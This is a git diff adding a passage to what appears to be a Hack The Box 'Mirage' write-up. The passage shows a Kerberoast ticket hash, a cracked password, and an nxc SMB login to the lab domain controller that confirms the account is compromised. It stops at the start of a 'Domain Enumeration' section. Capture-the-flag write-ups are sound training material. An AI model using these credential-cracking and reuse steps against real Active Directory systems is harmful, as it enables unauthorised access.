@@ -433,8 +433,16 @@ $krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb\nathan.aadam*$b02d96bed6193309f8
 The hash cracked!
 
 ```python
-
+❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u 'nathan.aadam' -p '3edc#EDC3' -k
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\nathan.aadam:3edc#EDC3
 ```
+
+This user is now compromised!
+
+# Domain Enumeration
+
+Il
 
 
 
